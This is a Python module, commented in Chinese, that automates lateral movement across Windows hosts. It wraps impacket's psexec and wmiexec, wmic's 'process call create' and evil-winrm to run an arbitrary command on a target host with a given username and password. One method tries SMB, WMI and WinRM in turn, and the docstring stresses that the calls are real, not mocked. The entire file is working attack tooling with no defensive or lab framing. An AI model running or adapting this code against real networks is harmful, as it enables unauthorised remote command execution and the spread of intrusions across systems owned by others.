# -*- coding: utf-8 -*-
"""lateral_movement.py — 横向移动。

真实调用：
  - SMB 横向（psexec.py / smbexec.py，impacket）
  - WMI 横向（wmic / wmiexec.py）
  - WinRM 横向（evil-winrm / winrm.vbs）
未安装工具时明确提示，不 mock。
"""
from __future__ import annotations

import shutil
import subprocess
from typing import Any, Dict, List

TIMEOUT = 300


def _which(name: str) -> Dict[str, Any]:
    p = shutil.which(name)
    return {"available": bool(p), "path": p, "error": None if p else f"{name} not in PATH"}


def _run(cmd: List[str], timeout: int = TIMEOUT) -> Dict[str, Any]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              encoding="utf-8", errors="replace",
                              timeout=timeout, check=False)
        return {"ok": proc.returncode == 0, "rc": proc.returncode,
                "stdout": (proc.stdout or "")[:20000],
                "stderr": (proc.stderr or "")[:4000],
                "error": None, "cmd": cmd}
    except FileNotFoundError as e:
        return {"ok": False, "rc": -1, "stdout": "", "stderr": "",
                "error": f"tool not found: {e}", "cmd": cmd}
    except subprocess.TimeoutExpired:
        return {"ok": False, "rc": -2, "stdout": "", "stderr": "",
                "error": f"timeout after {timeout}s", "cmd": cmd}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "rc": -3, "stdout": "", "stderr": "",
                "error": str(e), "cmd": cmd}


class LateralMover:
    """横向移动执行器。"""

    def tools_status(self) -> Dict[str, Any]:
        return {
            "psexec": _which("psexec.py") or _which("impacket-psexec"),
            "smbexec": _which("smbexec.py") or _which("impacket-smbexec"),
            "wmiexec": _which("wmiexec.py") or _which("impacket-wmiexec"),
            "wmic": _which("wmic"),
            "evil_winrm": _which("evil-winrm"),
        }

    def via_smb(self, target: str, user: str, password: str,
                command: str = "whoami", timeout: int = TIMEOUT) -> Dict[str, Any]:
        which = shutil.which("psexec.py") or shutil.which("impacket-psexec")
        if not which:
            return {"ok": False, "error": "psexec.py not found in PATH"}
        cmd = [which, f"{user}:{password}@{target}", command]
        return _run(cmd, timeout)

    def via_wmi(self, target: str, user: str, password: str,
                command: str = "whoami", timeout: int = TIMEOUT) -> Dict[str, Any]:
        which = shutil.which("wmiexec.py") or shutil.which("impacket-wmiexec")
        if which:
            cmd = [which, f"{user}:{password}@{target}", command]
            return _run(cmd, timeout)
        # fallback: wmic
        if shutil.which("wmic"):
            cmd = ["wmic", "/node:" + target, "/user:" + user,
                   "/password:" + password, "process", "call", "create", command]
            return _run(cmd, timeout)
        return {"ok": False, "error": "wmiexec.py/wmic not found in PATH"}

    def via_winrm(self, target: str, user: str, password: str,
                  command: str = "whoami", timeout: int = TIMEOUT) -> Dict[str, Any]:
        which = shutil.which("evil-winrm")
        if not which:
            return {"ok": False, "error": "evil-winrm not found in PATH"}
        # evil-winrm 是交互式，用 -c 执行单条命令
        cmd = [which, "-i", target, "-u", user, "-p", password, "-c", command]
        return _run(cmd, timeout)

    def full_move(self, target: str, user: str, password: str,
                  command: str = "whoami", timeout: int = TIMEOUT) -> Dict[str, Any]:
        return {
            "target": target,
            "smb": self.via_smb(target, user, password, command, timeout),
            "wmi": self.via_wmi(target, user, password, command, timeout),
            "winrm": self.via_winrm(target, user, password, command, timeout),
        }


_singleton: LateralMover | None = None


def get_lateral_mover() -> LateralMover:
    global _singleton
    if _singleton is None:
        _singleton = LateralMover()
    return _singleton
